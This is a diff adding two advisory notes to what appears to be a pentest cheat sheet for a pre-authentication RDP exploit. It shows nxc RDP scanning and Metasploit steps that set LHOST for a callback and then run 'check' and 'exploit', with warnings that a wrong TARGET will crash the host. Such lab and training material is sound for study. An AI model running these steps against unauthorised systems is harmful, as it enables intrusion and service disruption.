@@ -83,6 +83,7 @@ msf6 auxiliary(...) > run
 # nxc
 nxc rdp <target>            # banner, NLA status, and OS info
 ```
+> Replace `<target>` with the target IP. These scanners are non-destructive — use them for triage before deciding whether to fire the exploit. NLA-required hosts are not vulnerable pre-auth.
 
 NLA-required hosts cannot be exploited pre-auth — useful triage.
 
@@ -109,6 +110,7 @@ msf6 exploit(...) > set LHOST tun0
 msf6 exploit(...) > check
 msf6 exploit(...) > exploit
 ```
+> Always run `check` before `exploit` to confirm vulnerability without detonating. Set `TARGET` to match the exact OS/hypervisor — wrong value will BSoD the host. Replace the IP and LHOST with your values.
 
 Tuning knobs:
 
